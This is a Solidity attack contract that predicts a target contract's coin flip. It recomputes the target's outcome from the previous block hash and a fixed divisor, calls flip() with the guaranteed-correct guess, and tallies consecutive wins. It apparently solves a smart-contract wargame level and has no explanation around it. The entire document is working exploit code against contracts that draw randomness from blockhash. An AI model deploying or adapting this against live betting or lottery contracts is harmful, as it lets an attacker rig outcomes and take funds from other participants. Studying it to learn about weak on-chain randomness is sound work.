pragma solidity >0.7.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract FlipGuesser {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function coinFlipGuess(address _contractTarget) external returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) revert();

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;

        bool isRight = ICoinFlip(_contractTarget).flip(side);
        consecutiveWins = isRight ? consecutiveWins + 1 : 0;

        return consecutiveWins;
    }
}
